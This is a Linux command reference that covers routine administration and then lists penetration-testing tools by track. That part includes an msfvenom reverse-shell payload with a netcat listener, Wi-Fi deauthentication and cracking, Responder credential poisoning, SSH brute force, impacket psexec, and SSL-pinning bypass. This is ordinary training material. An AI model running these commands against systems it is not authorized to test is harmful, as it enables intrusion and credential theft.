# Linux from (Basics → Professional)

> **Scope:** This reference is written from a **Linux Admin I → Linux Admin II** perspective.
>
> It focuses on practical commands for **operations, troubleshooting, services, storage, and networking**, with a separate section for security and penetration-testing workflows.

### Conventions

- Commands that need root use `sudo`.
- Prefer an inspect-first workflow: `systemctl status` → `journalctl -u` → config check → restart/reload.

---

### Navigation & File Ops

#### Inspect

**pwd** — *Print working directory.*

- **Use when:** You need to confirm where you are before editing configs, running scripts, or writing output files.

```bash
pwd
```

**ls** — *List directory contents.*

- **Use when:** You want a quick inventory of files, permissions, sizes, and hidden entries.

```bash
ls -lah
```

**stat** — *Show detailed file metadata (mode, owner, timestamps).*

- **Use when:** You are debugging permissions, ownership, or “why didn’t this change apply” issues.

```bash
stat file
```

**file** — *Detect file type by content.*

- **Use when:** You are not sure if something is text, a binary, a compressed archive, or a certificate/key.

```bash
file file
```

#### Search

**find** — *Search the filesystem with powerful filters.*

- **Use when:** You need to locate configs, logs, keys, or recently modified files.

```bash
find /etc -type f -name "*.conf"
find /var/log -type f -mtime -1 -print
```

#### Copy / sync

**cp** — *Copy files/directories.*

- **Use when:** You are making a quick backup before editing, or copying a known-small set of files.

```bash
cp -av src/ dst/
```

**rsync** — *Efficient, reliable copy/sync (supports resume + attributes).*

- **Use when:** You are copying lots of data, syncing between servers, preserving permissions, or doing “backup-like” copies.

```bash
rsync -aHAX --info=progress2 src/ dst/
```

#### Archive

**tar** — *Create/extract archives (often with gzip).*

- **Use when:** You want to bundle directories for backup, transfer, or snapshotting `/etc` before changes.

```bash
tar -czf backup_etc.tgz /etc
#### Archive & Compression
tar -tzf backup_etc.tgz | head
```

---

### Text Processing (logs + configs)

#### View and follow

**less** — *Interactive file viewer (safe for huge logs).*

- **Use when:** You need to read long files without loading everything into an editor.

```bash
less /var/log/syslog
```

**tail** — *Show last lines (and follow updates with `-f`).*

- **Use when:** You are watching logs during a restart, deployment, or login test.

```bash
sudo tail -n 200 -f /var/log/auth.log
```

#### Search

**grep** — *Search text using patterns.*

- **Use when:** You are hunting config directives, error strings, IPs, usernames, or request paths.

```bash
grep -RIn "Listen" /etc/apache2/
grep -RIn -C 2 "error" /var/log/
```

#### Quick parsing

**awk** — *Field-oriented text processing.*

- **Use when:** You need to extract columns from command output quickly (logs, CSV-ish text, `ps`, etc.).

```bash
awk '{print $1}' file
```

**sed** — *Stream editor (search/replace).*

- **Use when:** You need quick, repeatable replacements (and you understand the blast radius).

```bash
sed -i 's/old/new/g' file
```

---

### Users, Groups, and Permissions

#### Identity

**id** — *Show UID/GID and groups.*

- **Use when:** Permissions fail and you need to confirm group membership.

```bash
id
```

**whoami** — *Print the effective user name.*

- **Use when:** You want to verify whether you are root or which account is active.

```bash
whoami
```

**groups** — *Show a user’s groups.*

- **Use when:** Access depends on group membership (e.g., `docker`, `sudo`, app-specific groups).

```bash
groups
```

#### Create / manage

**useradd** — *Create a user (low-level tool).*

- **Use when:** You are provisioning local accounts on servers.

```bash
sudo useradd -m -s /bin/bash alice
```

**passwd** — *Set or change a password.*

- **Use when:** You need to set initial credentials or reset access.

```bash
sudo passwd alice
```

**usermod** — *Modify user account properties.*

- **Use when:** You need to add users to groups (common) or change login shell/home.

```bash
sudo usermod -aG sudo alice
```

#### Permissions

**chmod** — *Change file mode bits.*

- **Use when:** Scripts are not executable, private keys are too open, or you need sane defaults on app dirs.

```bash
chmod 640 file
chmod -R u=rwX,g=rX,o= dir/
```

**chown** — *Change owner/group.*

- **Use when:** Services cannot read/write because files belong to the wrong user (very common after copying).

```bash
sudo chown -R root:root /etc/someapp/
```

**find (SUID/SGID audit)** — *Locate special-permission files.*

- **Use when:** You are auditing for privilege escalation paths or hardening.

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

---

### Processes & Resources

#### Process triage

**ps** — *Process list snapshot.*

- **Use when:** You need to see what’s running, CPU/mem hogs, or command lines.

```bash
ps aux --sort=-%cpu | head
```

**pgrep** — *Find process IDs by name/pattern.*

- **Use when:** You want to script checks or quickly locate a daemon’s PID.

```bash
pgrep -a sshd
```

**lsof** — *List open files and network sockets.*

- **Use when:** A port is “already in use” or you need to know which process owns a connection.

```bash
sudo lsof -i -P -n | head
```

#### Signals

**kill** — *Send a signal to a PID.*

- **Use when:** You need to stop a specific process cleanly (TERM) or forcefully (KILL).

```bash
kill -TERM 1234
```

**pkill** — *Send a signal by process name/pattern.*

- **Use when:** You need to terminate a family of processes (be careful with patterns).

```bash
pkill -f "python3.*http.server"
```

#### Resource snapshot

**free** — *Memory usage.*

- **Use when:** You suspect OOM, swapping, or memory pressure.

```bash
free -h
```

**uptime** — *Load averages + uptime.*

- **Use when:** You want a quick “is this host overloaded” signal.

```bash
uptime
```

**vmstat** — *CPU, memory, IO overview over time.*

- **Use when:** You need quick visibility into IO wait, runnable processes, and swap activity.

```bash
vmstat 1 5
```

---

### systemd (Linux Admin II core)

#### Services

**systemctl status/start/restart/reload/enable** — *Manage services.*

- **Use when:** You are operating daemons and want consistent service control.

```bash
sudo systemctl status nginx
sudo systemctl start nginx
sudo systemctl enable --now nginx
sudo systemctl restart nginx
sudo systemctl reload nginx
```

#### Unit discovery

**systemctl list-units / list-unit-files** — *Discover what is running/enabled.*

- **Use when:** You are inventorying services or checking boot persistence.

```bash
systemctl list-units --type=service --state=running
systemctl list-unit-files | grep enabled
```

#### Logs

**journalctl** — *Query logs (by boot, by unit, follow mode).*

- **Use when:** Debugging service failures, restarts, config issues, or boot problems.

```bash
journalctl -b
journalctl -u nginx --since "today"
journalctl -u nginx -f
```

---

### Networking (ops + troubleshooting)

#### Addresses / routes

**ip** — *Modern network interface + routing tool.*

- **Use when:** You need to validate IPs, gateways, and routes.

```bash
ip a
ip r
```

#### Listening sockets

**ss** — *Inspect listening ports and owning processes.*

- **Use when:** You need to confirm a service is bound to the right port/interface.

```bash
ss -lntp
ss -lunp
```

#### Connectivity

**ping** — *Basic reachability.*

- **Use when:** You need a fast check for packet loss and connectivity.

```bash
ping -c 3 8.8.8.8
```

**traceroute** — *Path analysis.*

- **Use when:** You suspect routing issues or where connectivity breaks.

```bash
traceroute 1.1.1.1
```

**curl** — *HTTP(S) requests and headers.*

- **Use when:** Testing endpoints, checking redirects/TLS, or doing quick API calls.

```bash
curl -I https://example.com
```

#### DNS

**resolvectl** — *Resolver status and DNS troubleshooting (systemd-resolved).*

- **Use when:** DNS fails and you need to confirm upstream servers and search domains.

```bash
resolvectl status
```

**getent** — *Query NSS (DNS, files, LDAP) consistently.*

- **Use when:** You want the same name resolution path applications use.

```bash
getent hosts example.com
```

---

### Storage (disks, mounts)

#### What’s mounted and what’s full

**df** — *Filesystem usage.*

- **Use when:** A service fails due to “no space left on device.”

```bash
df -hT
```

**lsblk** — *Block devices and filesystems.*

- **Use when:** You attach a new disk or need to map devices to mountpoints.

```bash
lsblk -f
```

#### Find large files

**du** — *Directory usage.*

- **Use when:** You need to identify which directory is eating space.

```bash
sudo du -xh /var | sort -h | tail -n 20
```

**find (size filter)** — *Locate large files quickly.*

- **Use when:** Logs or dumps explode and you need exact filenames.

```bash
sudo find /var/log -type f -size +100M -print
```

#### Mounting

**mount / umount** — *Attach/detach filesystems.*

- **Use when:** Working with removable disks, recovery, or manual mounts.

```bash
sudo mount /dev/sdb1 /mnt/data
sudo umount /mnt/data
```

**findmnt** — *Inspect mounts and verify `/etc/fstab`.*

- **Use when:** Troubleshooting boot mount failures and fstab errors.

```bash
sudo findmnt --verify
```

---

### Packages (Debian/Ubuntu)

**apt update/install/remove** — *Package management.*

- **Use when:** Installing software, patching, or removing services cleanly.

```bash
sudo apt update
sudo apt install -y nginx
sudo apt remove --purge nginx
```

**apt-cache policy** — *See available versions and installed version.*

- **Use when:** You need to understand why a package version is pinned or not updating.

```bash
apt-cache policy nginx
```

---

### Security & Access

#### SSH

**ssh-keygen** — *Generate SSH keys.*

- **Use when:** You want key-based auth instead of passwords.

```bash
ssh-keygen -t ed25519 -C "admin"
```

**ssh** — *Remote login / command execution.*

- **Use when:** Admin access, jumping into a host, or running remote tasks.

```bash
ssh -i ~/.ssh/id_ed25519 user@host
```

#### sudo

**sudo -l** — *Show allowed commands for the current user.*

- **Use when:** Checking privileges and debugging permission issues.

```bash
sudo -l
```

#### Firewall

**ufw** — *Simple firewall management.*

- **Use when:** You need quick host firewall rules without writing raw nftables rules.

```bash
sudo ufw status verbose
sudo ufw allow 22/tcp
```

---

### Troubleshooting playbook (fast)

1. **Confirm symptoms** (what fails, when, and for whom).
2. **Service health**

```bash
systemctl status <service>
```

1. **Logs**

```bash
journalctl -u <service> -n 200 --no-pager
```

1. **Ports**

```bash
ss -lntp | grep <port>
```

1. **Disk + permissions** (`df -hT`, `ls -l`, `stat`).

---

<aside>
🔐

### Pentest specialization (offensive tracks)

</aside>

- Web (web apps + APIs)
- Android (mobile)
- iOS (mobile)
- Network / internal (wired, AD)
- Wireless (Wi‑Fi)
- Application (thick client / desktop)
- Reverse engineering (binaries)
- Malware development
- Malware reverse engineering
- Cloud (AWS/Azure/GCP)
- Containers & Kubernetes
- IoT / embedded
- Reporting & evidence

---

#### iOS (mobile)

**idevice\** *(libimobiledevice) —* Interact with iOS devices from Linux.*

- **Use when:** You need device info, install apps, pull logs, or access file containers (depending on setup).

```bash
idevice_id -l
ideviceinfo
idevicesyslog
```

**frida** — *Runtime instrumentation (iOS too).*

- **Use when:** Bypassing jailbreak detection, SSL pinning, or hooking functions.

```bash
frida-ps -U
frida -U -f com.target.app -l script.js --no-pause
```

**objection** — *Frida helper.*

- **Use when:** Faster workflows for common mobile actions.

```bash
objection -g com.target.app explore
```

---

#### Application (thick client / desktop)

**strings** — *Extract printable strings from binaries.*

- **Use when:** Quick triage for endpoints, API keys, file paths, error messages.

```bash
strings -n 6 app.exe | head
```

**ltrace / strace** — *Trace library calls / syscalls.*

- **Use when:** Understanding runtime behavior, file/network access, and execution flow.

```bash
strace -f -o trace.log ./app
ltrace -f -o ltrace.log ./app
```

**mitmproxy** — *Intercept app traffic.*

- **Use when:** Thick clients talk to APIs and you need to observe/modify requests.

```bash
mitmproxy -p 8080
```

---

#### Reverse engineering (binaries)

**readelf / objdump** — *Inspect ELF headers, sections, symbols.*

- **Use when:** You need quick static insight (arch, symbols, imports, protections).

```bash
readelf -h ./bin
objdump -d ./bin | head
```

**nm** — *List symbols.*

- **Use when:** Looking for interesting functions or exported symbols.

```bash
nm -an ./bin | head
```

**gdb (with peda/gef/pwndbg)** — *Debugging.*

- **Use when:** Dynamic analysis, breakpointing, crash triage.

```bash
gdb -q ./bin
```

**radare2** — *RE framework (CLI).*

- **Use when:** You prefer CLI-driven reversing.

```bash
r2 -A ./bin
```

---

#### Malware development (red-team tooling)

**python3 + venv** — *Build and test tooling safely.*

- **Use when:** Writing internal scripts and payload tooling in a controlled lab.

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

**gcc / make** — *Compile C tooling.*

- **Use when:** Compiling PoCs or lab tooling.

```bash
gcc tool.c -o tool
make
```

**openssl** — *Crypto, certs, and signing primitives.*

- **Use when:** Generating keys/certs for C2, mutual TLS, or test signing.

```bash
openssl genrsa -out key.pem 2048
openssl req -new -x509 -key key.pem -out cert.pem -days 365
```

---

#### Malware reverse engineering

**sha256sum** — *Hash samples for tracking.*

- **Use when:** You need immutable identifiers and evidence handling.

```bash
sha256sum sample.bin
```

**file / strings** — *Initial triage.*

- **Use when:** Determining type, packers, and obvious IOCs.

```bash
file sample.bin
strings -n 6 sample.bin | head
```

**yara** — *Pattern matching rules.*

- **Use when:** Classifying families and hunting across collections.

```bash
yara -r rules.yar samples/
```

**pescanner / pefile tooling** — *PE inspection (Windows samples).*

- **Use when:** Extracting imports/sections quickly.

```bash
pescanner sample.exe
```

---

#### Cloud (AWS/Azure/GCP)

**aws** — *AWS CLI.*

- **Use when:** Cloud asset review, IAM tests, S3 enumeration (authorized).

```bash
aws sts get-caller-identity
aws s3 ls
```

**az** — *Azure CLI.*

- **Use when:** Subscription/resource enumeration and RBAC checks.

```bash
az account show
az resource list --output table
```

**gcloud** — *GCP CLI.*

- **Use when:** Project/resource enumeration and IAM checks.

```bash
gcloud auth list
gcloud projects list
```

---

#### Containers & Kubernetes

**docker** — *Container operations.*

- **Use when:** Inspecting images/containers and local lab workloads.

```bash
docker ps
docker images
```

**trivy** — *Image and filesystem vulnerability scanning.*

- **Use when:** Quick container security checks.

```bash
trivy image nginx:latest
```

**kubectl** — *Kubernetes control.*

- **Use when:** Enumerating cluster resources and RBAC (authorized).

```bash
kubectl get pods -A
kubectl auth can-i --list
```

---

#### IoT / embedded

**binwalk** — *Firmware analysis and extraction.*

- **Use when:** Extracting filesystems and analyzing firmware blobs.

```bash
binwalk -e firmware.bin
```

**qemu-system-\** *—* Emulate targets.*

- **Use when:** You need a safe environment to run extracted firmware.

```bash
qemu-system-x86_64 --version
```

---

#### Common across tracks (recon + enumeration)

**nmap** — *Port and service discovery.*

- **Use when:** You need an inventory of open ports and services.

```bash
nmap -sV -sC -p- -oA scan_results 192.168.1.100
```

**masscan** — *Ultra-fast port scanner (noisy).*

- **Use when:** You need a quick wide sweep, then validate results with `nmap`.

```bash
sudo masscan 10.10.0.0/16 -p1-65535 --rate 10000 -oL masscan.lst
```

**rustscan** — *Fast port discovery that can hand off to `nmap`.*

- **Use when:** You want a fast scan workflow with sane defaults.

```bash
rustscan -a 10.10.10.10 -- -sV -sC
```

**dnsrecon** — *DNS enumeration.*

- **Use when:** You are enumerating DNS records and common subdomains.

```bash
dnsrecon -d example.com -t std
```

**whois** — *Domain registration info.*

- **Use when:** You need basic OSINT and ownership clues.

```bash
whois example.com | head
```

---

#### Web (web apps + APIs)

**burpsuite** — *Intercepting proxy + web testing suite.*

- **Use when:** You are intercepting/modifying requests, replaying, fuzzing, and scanning.

```bash
burpsuite --config-file=project.json
```

**ffuf** — *Fast content discovery / fuzzing.*

- **Use when:** You are brute-forcing directories, files, parameters, or virtual hosts.

```bash
ffuf -u https://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
```

**gobuster** — *Dir/DNS brute forcing.*

- **Use when:** You want quick directory or DNS enumeration.

```bash
gobuster dir -u https://target -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**nikto** — *Web server misconfig scanner.*

- **Use when:** You want quick checks for common risky config issues.

```bash
nikto -h https://target
```

**sqlmap** — *Automated SQL injection testing.*

- **Use when:** You have a strong suspicion of SQLi and need fast enumeration (be careful with impact).

```bash
sqlmap -u 'http://target.com/page.php?id=1' --dbs --batch
```

**jwt-tool** — *JWT analysis and attacks.*

- **Use when:** You encounter JWT auth and need to test weak secrets / alg confusion.

```bash
jwt-tool <JWT_HERE> -t https://target/api -M pb
```

---

#### Android (mobile app pentesting)

**adb** — *Android Debug Bridge.*

- **Use when:** You have a device/emulator and need shell, files, logs, or port forwards.

```bash
adb devices
adb shell
adb logcat
```

**apktool** — *Decode/rebuild APK resources and manifest.*

- **Use when:** You need to review app resources, permissions, and smali structure.

```bash
apktool d app.apk -o app_src
```

**jadx** — *Java decompiler for APK/DEX.*

- **Use when:** You want readable source-level decompilation to understand logic.

```bash
jadx -d jadx_out app.apk
```

**frida** — *Runtime instrumentation.*

- **Use when:** You need to bypass root checks/SSL pinning or hook sensitive functions.

```bash
frida-ps -U
frida -U -f com.target.app -l script.js --no-pause
```

**objection** — *Frida helper for mobile.*

- **Use when:** You want quick, repeatable mobile runtime actions (SSL pinning bypass, dumping, etc.).

```bash
objection -g com.target.app explore
```

---

#### Wireless (Wi‑Fi)

**airmon-ng** — *Enable monitor mode.*

- **Use when:** Preparing a wireless adapter for capture.

```bash
sudo airmon-ng start wlan0
```

**airodump-ng** — *Capture 802.11 traffic.*

- **Use when:** Capturing handshakes and observing clients/APs.

```bash
sudo airodump-ng wlan0mon
```

**aireplay-ng** — *Packet injection / deauth.*

- **Use when:** Triggering re-auth to capture handshakes (authorized testing only).

```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
```

**aircrack-ng** — *Crack captured handshakes.*

- **Use when:** Testing WPA/WPA2 strength with wordlists.

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap
```

**wifite** — *Automated wireless attack workflow.*

- **Use when:** You want an automated (but potentially noisy) test workflow.

```bash
sudo wifite
```

---

#### Wired network (internal + AD-style environments)

**netcat (nc)** — *Swiss-army TCP/UDP tool.*

- **Use when:** Quick port checks, banner grabs, simple listeners.

```bash
nc -nv 10.10.10.10 445
nc -lvnp 4444
```

**tcpdump** — *Packet capture.*

- **Use when:** You need to prove traffic paths, debug callbacks, or capture auth attempts.

```bash
sudo tcpdump -i eth0 -nn host 10.10.10.10
```

**responder** — *LLMNR/NBT-NS/mDNS poisoning for credential capture.*

- **Use when:** Testing name-resolution weaknesses in an internal network.

```bash
sudo responder -I eth0
```

**crackmapexec** — *SMB/AD enumeration + lateral movement helper.*

- **Use when:** Enumerating SMB, validating creds, and mapping shares.

```bash
crackmapexec smb 10.10.10.0/24 -u user -p 'Passw0rd!'
```

**impacket (examples)** — *Collection of network protocols tools.*

- **Use when:** You need targeted AD attacks or remote execution primitives.

```bash
impacket-psexec DOMAIN/user:'Passw0rd!'@10.10.10.10
```

---

#### Password attacks

**hydra** — *Online brute-force against services.*

- **Use when:** Testing weak passwords on network services (rate-limit aware).

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50
```

**john** — *Offline password/hash cracking.*

- **Use when:** You have hashes and want dictionary/rules attacks.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
```

**hashcat** — *GPU-accelerated cracking.*

- **Use when:** You need speed, custom rules, or large cracking jobs.

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

#### Exploit development / tooling

**searchsploit** — *Search Exploit-DB from terminal.*

- **Use when:** Mapping discovered versions to known exploits.

```bash
searchsploit "apache 2.4"
```

**msfconsole** — *Metasploit console.*

- **Use when:** You need a rapid exploit/payload workflow and post modules.

```bash
msfconsole -q
```

**msfvenom** — *Payload generation.*

- **Use when:** Generating payloads for controlled tests.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o rev.elf
```

---

#### Reporting / evidence

**tee** — *Write output to screen and file.*

- **Use when:** Capturing terminal evidence while still seeing output.

```bash
nmap -sV 10.10.10.10 | tee nmap.txt
```

**sha256sum** — *File integrity hashes.*

- **Use when:** Preserving evidence integrity for reports.

```bash
sha256sum loot.tgz > loot.tgz.sha256
```